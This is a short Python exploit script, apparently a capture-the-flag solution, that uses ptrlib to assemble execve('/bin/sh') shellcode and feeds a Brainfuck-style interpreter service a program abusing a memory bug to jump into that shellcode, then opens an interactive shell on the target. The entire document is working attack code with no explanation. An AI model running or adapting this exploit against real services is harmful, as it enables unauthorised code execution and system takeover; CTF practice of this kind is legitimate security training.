from ptrlib import *
import time
import os

HOST = os.getenv("HOST", "localhost")
PORT = int(os.getenv("PORT", "9004"))

shellcode = nasm("""
xor edx, edx
xor esi, esi
lea rdi, [rel binsh]
mov eax, 59
syscall
binsh: db "/bin/sh",0
""", bits=64)

code = ''
code += '>,' * len(shellcode)
code += '<' * (len(shellcode))
code += '[' # bug
code += '<'*0x7cda # call shellcode
assert len(code) < 0x8000

sock = Socket(HOST, PORT)
#sock = Process(["python", "app.py"], cwd="../distfiles")
sock.sendlineafter(": ", code)
time.sleep(1)
sock.send(shellcode)
sock.sh()
